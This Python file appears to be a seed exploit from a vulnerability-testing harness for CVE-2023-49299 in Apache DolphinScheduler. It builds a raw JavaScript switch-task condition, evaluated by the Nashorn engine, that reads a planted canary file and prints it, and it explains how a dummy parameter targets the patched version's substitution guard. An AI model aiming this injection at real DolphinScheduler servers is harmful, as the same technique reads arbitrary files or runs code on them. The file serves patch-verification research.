#!/usr/bin/env python3
"""[GIVEN] CVE-2023-49299 seed exploit for apache-dolphinscheduler-cve-2024-23320.

The switch-task condition is attacker-controlled and evaluated through the Nashorn
"js" ScriptEngine (SwitchTaskUtils.evaluate). The original vector is a RAW arbitrary-JS
condition (no ${param} template) that reads the planted canary file and echoes it:

    java.lang.System.out.println('PCBOUT:'+ <read /canary/flag.txt> )

On V0 (3.1.8, pre-CVE-2023-49299) SwitchTaskUtils has no content guard -> the JS runs
and the flag is echoed (REACHES). On V1 (3.1.9, CVE-2023-49299 patched)
generateContentWithTaskParams rejects a condition where nothing was substituted from a
${param} template (the no-substitution / empty-params guard) -> BLOCKED before eval.

A dummy, deliberately-UNREFERENCED param is supplied so the block on V1 is specifically
the *no-substitution* guard (the guard the CVE-2024-23320 residual defeats), not merely
the empty-params guard.
"""

# benign canary JS: read the planted flag file and echo it; no real command is executed.
_READ = ("new java.lang.String(java.nio.file.Files.readAllBytes("
         "java.nio.file.Paths.get(\"/canary/flag.txt\")))")

# ...;true -> the injected condition ends in a boolean, exactly like a real switch
# condition, so SwitchTaskUtils.evaluate() returns cleanly after the canary side-effect.
CONDITION = "java.lang.System.out.println('PCBOUT:'+" + _READ + ");true"


def candidate():
    return {
        "id": "cve-2023-49299-raw-js",
        "condition": CONDITION,
        # unreferenced dummy param -> substitution runs but changes nothing -> no-substitution guard on V1.
        "params": {"unused": "1"},
    }


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
